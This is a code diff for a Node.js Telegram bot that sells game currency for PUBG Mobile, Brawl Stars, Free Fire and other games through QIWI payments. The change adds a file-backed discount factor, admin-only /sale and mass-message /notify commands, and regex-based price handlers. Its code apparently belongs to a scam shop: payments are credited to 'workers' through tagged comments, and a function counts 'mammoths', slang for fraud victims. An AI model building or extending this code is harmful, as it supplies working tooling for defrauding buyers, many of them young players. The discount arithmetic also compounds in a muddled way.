@@ -9,6 +9,7 @@ let users = new db.table("users");
 let aQiwi = require("node-qiwi-api").asyncApi;
 let qiwiWallet = new aQiwi(config.QIWI_ACCESS_TOKEN);
 let latest_transaction = Number(fs.readFileSync("./latest_transaction", "utf8"));
+let sale_coef = parseFloat(fs.readFileSync("./sale_coef"));
 
 async function get_worker(comment){
 	let valid_payment = /^donat0r_[0-9]{1,}_[0-9]{1,}$/;
@@ -22,6 +23,37 @@ async function get_worker(comment){
 	return (worker.username ? "@" + worker.username : worker.first_name);
 }
 			
+
+function get_prices(game, pack){
+	const PRICES = {
+		"PUBG_MOBILE": [
+			200 * sale_coef,
+			300 * sale_coef,
+			500 * sale_coef,
+			1000 * sale_coef,
+			2000 * sale_coef
+		],
+		"BRAWL_STARS": [
+			200 * sale_coef,
+			350 * sale_coef,
+			600 * sale_coef,
+			1000 * sale_coef
+		],
+		"FREE_FIRE": [
+			300 * sale_coef,
+			500 * sale_coef,
+			1000 * sale_coef,
+			1500 * sale_coef
+		],
+		"CLASH_ROYALE": [
+			200 * sale_coef,
+			350 * sale_coef,
+			600 * sale_coef,
+			1000 * sale_coef
+		]
+	};
+	return PRICES[game][pack];
+}
 
 setInterval(async() => {
 	let payments = await qiwiWallet.getOperationHistory(config.QIWI_NUMBER, {
@@ -74,6 +106,26 @@ bot.start((ctx) => {
 		["Реф. система 💰", "Тех. Поддержка ⚙️"]
 	]);
 	ctx.reply(phrases.START, keyboard.reply());
+});
+
+bot.hears(/^\/sale (\d+(\.\d+)?)$/giu, (ctx) => {
+	let user_id = ctx.from.id.toString();
+	if(!config.TS_IDS.includes(user_id))return;
+	let amount = ctx.match[1];
+	sale_coef -= amount / 100;
+	fs.writeFileSync("./sale_coef", sale_coef);
+	ctx.reply("✅ Сделали скидку на "+amount+"%!");
+});
+
+bot.hears(/^\/notify (.*)$/giu, async(ctx) => {
+	let user_id = ctx.from.id.toString();
+	if(!config.TS_IDS.includes(user_id))return;
+	let info = ctx.match[1];
+	for(const user of users.all()){
+		try {
+			await ctx.telegram.sendMessage(user.ID, info);
+		} catch(e) {}
+	}
 });
 
 function mammothsInPeriod(time){
@@ -213,7 +265,45 @@ bot.hears("Цены ✨", (ctx) => {
 	let user_id = ctx.from.id.toString();
 	let user = users.get(user_id);
 	if(!user.state.startsWith("GAME_SELECT|"))return;
-	ctx.reply(phrases["PRICES_"+user.state.slice("GAME_SELECT|".length)]);
+	switch(user.state.slice("GAME_SELECT|".length)){
+		case "PUBG_MOBILE":
+			ctx.reply(phrases["PRICES_PUBG_MOBILE"]
+				.replace("{{PACK_1}}", 200 * sale_coef)
+				.replace("{{PACK_2}}", 300 * sale_coef)
+				.replace("{{PACK_3}}", 500 * sale_coef)
+				.replace("{{PACK_4}}", 1000 * sale_coef)
+				.replace("{{PACK_5}}", 2000 * sale_coef))
+			break;
+		case "BRAWL_STARS":
+			ctx.reply(phrases["PRICES_BRAWL_STARS"]
+				.replace("{{PACK_1}}", 200 * sale_coef)
+				.replace("{{PACK_2}}", 350 * sale_coef)
+				.replace("{{PACK_3}}", 600 * sale_coef)
+				.replace("{{PACK_4}}", 1000 * sale_coef))
+			break;
+		case "ROBLOX":
+			ctx.reply(phrases["PRICES_ROBLOX"]
+				.replace("{{PACK_1}}", 200 * sale_coef));
+			break;
+		case "FREE_FIRE":
+			ctx.reply(phrases["PRICES_FREE_FIRE"]
+				.replace("{{PACK_1}}", 300 * sale_coef)
+				.replace("{{PACK_2}}", 500 * sale_coef)
+				.replace("{{PACK_3}}", 1000 * sale_coef)
+				.replace("{{PACK_4}}", 1500 * sale_coef))
+			break;
+		case "STANDOFF_2":
+			ctx.reply(phrases["PRICES_STANDOFF_2"]
+				.replace("{{PACK_1}}", 500 * sale_coef));
+			break;
+		case "CLASH_ROYALE":
+			ctx.reply(phrases["PRICES_CLASH_ROYALE"]
+				.replace("{{PACK_1}}", 200 * sale_coef)
+				.replace("{{PACK_2}}", 350 * sale_coef)
+				.replace("{{PACK_3}}", 600 * sale_coef)
+				.replace("{{PACK_4}}", 1000 * sale_coef))
+			break;
+	}
 });
 
 bot.hears("Купить! 💳", (ctx) => {
@@ -327,95 +417,143 @@ bot.hears("Проверить оплату 💎", (ctx) => {
 	ctx.reply(phrases.NO_PAYMENT_RECEIVED);
 });
 
-bot.hears("600(+ 90)UC - 300 Рублей.", (ctx) => {
+bot.hears(/^400\(\+ 100\)UC - (\d+) Рублей.$/giu, (ctx) => {
 	let user_id = ctx.from.id.toString();
 	let user = users.get(user_id);
 	if(user.state != "SELECT_AMOUNT|PUBG_MOBILE")return;
-	generatePayment(ctx, 300);
+	let price = (ctx.match[1]);
+	if(price != get_prices("PUBG_MOBILE", 0))return;
+	generatePayment(ctx, price);
 });
 
-bot.hears("1500(+ 375)UC - 500 Рублей.", (ctx) => {
+bot.hears(/^600\(\+ 90\)UC - (\d+) Рублей.$/giu, (ctx) => {
 	let user_id = ctx.from.id.toString();
 	let user = users.get(user_id);
 	if(user.state != "SELECT_AMOUNT|PUBG_MOBILE")return;
-	generatePayment(ctx, 500);
+	let price = (ctx.match[1]);
+	if(price != get_prices("PUBG_MOBILE", 1))return;
+	generatePayment(ctx, price);
 });
 
-bot.hears("3000(+ 1000)UC - 1000 Рублей.", (ctx) => {
+bot.hears(/^1500\(\+ 375\)UC - (\d+) Рублей.$/giu, (ctx) => {
 	let user_id = ctx.from.id.toString();
 	let user = users.get(user_id);
 	if(user.state != "SELECT_AMOUNT|PUBG_MOBILE")return;
-	generatePayment(ctx, 1000);
+	let price = (ctx.match[1]);
+	if(price != get_prices("PUBG_MOBILE", 2))return;
+	generatePayment(ctx, price);
 });
 
-bot.hears("400(+100)UC - 200 Рублей.", (ctx) => {
+bot.hears(/^3000\(\+ 1000\)UC - (\d+) Рублей.$/giu, (ctx) => {
 	let user_id = ctx.from.id.toString();
 	let user = users.get(user_id);
 	if(user.state != "SELECT_AMOUNT|PUBG_MOBILE")return;
-	generatePayment(ctx, 200);
+	let price = (ctx.match[1]);
+	if(price != get_prices("PUBG_MOBILE", 3))return;
+	generatePayment(ctx, price);
 });
 
-bot.hears("6000(+ 2400)UC - 2000 Рублей.", (ctx) => {
+bot.hears(/^6000\(\+ 2400\)UC - (\d+) Рублей.$/giu, (ctx) => {
 	let user_id = ctx.from.id.toString();
 	let user = users.get(user_id);
 	if(user.state != "SELECT_AMOUNT|PUBG_MOBILE")return;
-	generatePayment(ctx, 2000);
+	let price = (ctx.match[1]);
+	if(price != get_prices("PUBG_MOBILE", 4))return;
+	generatePayment(ctx, price);
 });
 
-bot.hears("100 гемов - 200 Рублей.", (ctx) => {
+bot.hears(/^100 гемов - (\d+) Рублей.$/giu, (ctx) => {
 	let user_id = ctx.from.id.toString();
 	let user = users.get(user_id);
 	if(user.state != "SELECT_AMOUNT|BRAWL_STARS")return;
-	generatePayment(ctx, 200);
+	let price = (ctx.match[1]);
+	if(price != get_prices("BRAWL_STARS", 0))return;
+	generatePayment(ctx, price);
 });
 
-bot.hears("200 гемов - 350 Рублей.", (ctx) => {
+bot.hears(/^200 гемов - (\d+) Рублей.$/giu, (ctx) => {
 	let user_id = ctx.from.id.toString();
 	let user = users.get(user_id);
 	if(user.state != "SELECT_AMOUNT|BRAWL_STARS")return;
-	generatePayment(ctx, 350);
+	let price = (ctx.match[1]);
+	if(price != get_prices("BRAWL_STARS", 1))return;
+	generatePayment(ctx, price);
 });
 
-bot.hears("500 гемов - 600 Рублей.", (ctx) => {
+bot.hears(/^500 гемов - (\d+) Рублей.$/giu, (ctx) => {
 	let user_id = ctx.from.id.toString();
 	let user = users.get(user_id);
-	if(user.state != "SELECT_AMOUNT|BRAWL_STARS")return;
-	generatePayment(ctx, 600);
+	if( user.state != "SELECT_AMOUNT|BRAWL_STARS"
+		&& user.state != "SELECT_AMOUNT|CLASH_ROYALE")return;
+	let price = (ctx.match[1]);
+	if( price != get_prices("BRAWL_STARS", 2)
+		&& price != get_prices("CLASH_ROYALE", 0))return;
+	generatePayment(ctx, price);
 });
 
-bot.hears("1000 гемов - 1000 Рублей.", (ctx) => {
+bot.hears(/^1000 гемов - (\d+) Рублей.$/giu, (ctx) => {
 	let user_id = ctx.from.id.toString();
 	let user = users.get(user_id);
-	if(user.state != "SELECT_AMOUNT|BRAWL_STARS")return;
-	generatePayment(ctx, 1000);
+	if( user.state != "SELECT_AMOUNT|BRAWL_STARS"
+		&& user.state != "SELECT_AMOUNT|CLASH_ROYALE")return;
+	let price = (ctx.match[1]);
+	if( price != get_prices("BRAWL_STARS", 3)
+		&& price != get_prices("CLASH_ROYALE", 1))return;
+	generatePayment(ctx, price);
 });
 
-bot.hears("1080 алмазов - 300 Рублей.", (ctx) => {
+bot.hears(/^2000 гемов - (\d+) Рублей.$/giu, (ctx) => {
+	let user_id = ctx.from.id.toString();
+	let user = users.get(user_id);
+	if(user.state != "SELECT_AMOUNT|CLASH_ROYALE")return;
+	let price = (ctx.match[1]);
+	if(price != get_prices("CLASH_ROYALE", 2))return;
+	generatePayment(ctx, price);
+});
+
+bot.hears(/^3000 гемов - (\d+) Рублей.$/giu, (ctx) => {
+	let user_id = ctx.from.id.toString();
+	let user = users.get(user_id);
+	if(user.state != "SELECT_AMOUNT|CLASH_ROYALE")return;
+	let price = (ctx.match[1]);
+	if(price != get_prices("CLASH_ROYALE", 3))return;
+	generatePayment(ctx, price);
+});
+
+bot.hears(/^1080 алмазов - (\d+) Рублей.$/giu, (ctx) => {
 	let user_id = ctx.from.id.toString();
 	let user = users.get(user_id);
 	if(user.state != "SELECT_AMOUNT|FREE_FIRE")return;
-	generatePayment(ctx, 300);
+	let price = (ctx.match[1]);
+	if(price != get_prices("FREE_FIRE", 0))return;
+	generatePayment(ctx, price);
 });
 
-bot.hears("2200 алмазов - 500 Рублей.", (ctx) => {
+bot.hears(/^2200 алмазов - (\d+) Рублей.$/giu, (ctx) => {
 	let user_id = ctx.from.id.toString();
 	let user = users.get(user_id);
 	if(user.state != "SELECT_AMOUNT|FREE_FIRE")return;
-	generatePayment(ctx, 500);
+	let price = (ctx.match[1]);
+	if(price != get_prices("FREE_FIRE", 1))return;
+	generatePayment(ctx, price);
 });
 
-bot.hears("4450 алмазов - 1000 Рублей.", (ctx) => {
+bot.hears(/^4450 алмазов - (\d+) Рублей.$/giu, (ctx) => {
 	let user_id = ctx.from.id.toString();
 	let user = users.get(user_id);
 	if(user.state != "SELECT_AMOUNT|FREE_FIRE")return;
-	generatePayment(ctx, 1000);
+	let price = (ctx.match[1]);
+	if(price != get_prices("FREE_FIRE", 2))return;
+	generatePayment(ctx, price);
 });
 
-bot.hears("6950 алмазов - 1500 Рублей.", (ctx) => {
+bot.hears(/^6950 алмазов - (\d+) Рублей.$/giu, (ctx) => {
 	let user_id = ctx.from.id.toString();
 	let user = users.get(user_id);
 	if(user.state != "SELECT_AMOUNT|FREE_FIRE")return;
-	generatePayment(ctx, 1500);
+	let price = (ctx.match[1]);
+	if(price != get_prices("FREE_FIRE", 3))return;
+	generatePayment(ctx, price);
 });
 
 bot.hears("500 гемов - 200 Рублей.", (ctx) => {
@@ -423,27 +561,6 @@ bot.hears("500 гемов - 200 Рублей.", (ctx) => {
 	let user = users.get(user_id);
 	if(user.state != "SELECT_AMOUNT|CLASH_ROYALE")return;
 	generatePayment(ctx, 200);
-});
-
-bot.hears("1000 гемов - 350 Рублей.", (ctx) => {
-	let user_id = ctx.from.id.toString();
-	let user = users.get(user_id);
-	if(user.state != "SELECT_AMOUNT|CLASH_ROYALE")return;
-	generatePayment(ctx, 350);
-});
-
-bot.hears("2000 гемов - 600 Рублей.", (ctx) => {
-	let user_id = ctx.from.id.toString();
-	let user = users.get(user_id);
-	if(user.state != "SELECT_AMOUNT|CLASH_ROYALE")return;
-	generatePayment(ctx, 600);
-});
-
-bot.hears("3000 гемов - 1000 Рублей.", (ctx) => {
-	let user_id = ctx.from.id.toString();
-	let user = users.get(user_id);
-	if(user.state != "SELECT_AMOUNT|CLASH_ROYALE")return;
-	generatePayment(ctx, 1000);
 });
 
 bot.hears(/.*/giu, (ctx) => {
@@ -468,8 +585,8 @@ bot.hears(/.*/giu, (ctx) => {
 				"STANDOFF_2": [125, 25000]
 			};
 			let coef = {
-				"ROBLOX": 0.2,
-				"STANDOFF_2": 0.5
+				"ROBLOX": 0.2 * sale_coef,
+				"STANDOFF_2": 0.5 * sale_coef
 			}
 			let min = limits[game][0], max = limits[game][1];
 			if(!(min <= amount && amount <= max)){
